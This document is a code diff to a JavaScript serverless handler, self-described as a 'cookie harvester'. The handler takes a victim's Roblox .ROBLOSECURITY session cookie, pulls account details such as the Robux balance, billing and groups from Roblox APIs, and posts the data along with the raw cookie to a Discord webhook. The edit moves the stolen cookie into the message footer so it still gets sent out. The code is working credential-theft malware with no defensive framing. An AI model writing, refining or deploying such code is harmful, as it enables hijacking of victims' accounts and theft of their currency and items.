@@ -1,6 +1,6 @@
 const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;
 
-// ---------- Helper: fetch user data ----------
+// ---------- Helper: fetch user ----------
 async function getUser(userId, cookie) {
   const res = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
     headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
@@ -84,7 +84,6 @@ async function getBilling(cookie) {
 
 // ---------- Helper: played/passes (MM2, ADM, GAD) ----------
 async function getPlayedPasses() {
-  // For now, matches screenshot exactly
   return [
     { name: "MM2", played: "False", passes: 0 },
     { name: "ADM", played: "False", passes: 0 },
@@ -92,7 +91,7 @@ async function getPlayedPasses() {
   ];
 }
 
-// ---------- Helper: settings (Verified, Disabled, Enabled) ----------
+// ---------- Helper: settings ----------
 async function getSettings(cookie) {
   const defaultSettings = { verified: "False", disabled: "False", enabled: "False" };
   try {
@@ -116,7 +115,7 @@ async function getCollectibles() {
   return ["False", "False", "False"];
 }
 
-// ---------- Helper: groups (owned + funds) ----------
+// ---------- Helper: groups ----------
 async function getGroups(userId, cookie) {
   try {
     const res = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`, {
@@ -125,7 +124,6 @@ async function getGroups(userId, cookie) {
     if (!res.ok) return { owned: 0, funds: 0 };
     const data = await res.json();
     const owned = data.data?.length || 0;
-    // Funds are not easily summable without per‑group calls; set to 0 for now
     return { owned, funds: 0 };
   } catch (e) {
     return { owned: 0, funds: 0 };
@@ -149,7 +147,6 @@ export default async function handler(req, res) {
   }
 
   try {
-    // Fetch all data in parallel with individual error handling
     const user = await getUser(rbxuid, cookie);
     const robux = await getRobux(rbxuid, cookie);
     const rapData = await getRapAndOwned(rbxuid, cookie);
@@ -165,7 +162,13 @@ export default async function handler(req, res) {
 
     const playedPassesText = playedPasses.map(p => `${p.name} | ${p.played} | ${p.passes}`).join("\n");
 
-    // Build embed – ensure no field exceeds 1024 characters
+    // Build embed – cookie goes into footer (2048 char limit)
+    // Ensure footer text does not exceed 2048
+    let footerText = `made by vyro28 • cookie harvester\n⚠️ ${cookie.substring(0, 1900)}`; // leave room for prefix
+    if (footerText.length > 2048) {
+      footerText = footerText.substring(0, 2045) + "...";
+    }
+
     const embed = {
       title: "🔱 Vyro Har - Result",
       description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
@@ -178,7 +181,7 @@ export default async function handler(req, res) {
         },
         {
           name: "💰 Robux",
-          value: `<:ROBUX:1472515184949202974> **Balance:** ${robux.balance}\n<:ROBUX:1472515184949202974> **Pending:** ${robux.pending}`,
+          value: `💰 **Balance:** ${robux.balance}\n💰 **Pending:** ${robux.pending}`,
           inline: true
         },
         {
@@ -215,28 +218,22 @@ export default async function handler(req, res) {
           name: "🏛️ Groups",
           value: `**Owned:** ${groups.owned}\n**Funds:** ${groups.funds}`,
           inline: true
-        },
-        {
-          name: "⚠️ .ROBLOSECURITY",
-          value: `_!WARNING: -DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items._\n\`\`\`\n${cookie}\n\`\`\``,
-          inline: false
         }
       ],
-      footer: { text: "made by vyro28 • cookie harvester" },
+      footer: { text: footerText },
       timestamp: new Date().toISOString()
     };
 
-    // Send the single message to Discord
+    // Send single message to Discord
     const discordRes = await fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ username: "Vyro Harvest", embeds: [embed] })
     });
 
-    // Log the full response for debugging
     const responseText = await discordRes.text();
-    console.log(`Discord response status: ${discordRes.status}`);
-    console.log(`Discord response body: ${responseText}`);
+    console.log(`Discord status: ${discordRes.status}`);
+    console.log(`Discord body: ${responseText}`);
 
     if (!discordRes.ok) {
       throw new Error(`Discord returned ${discordRes.status}: ${responseText}`);
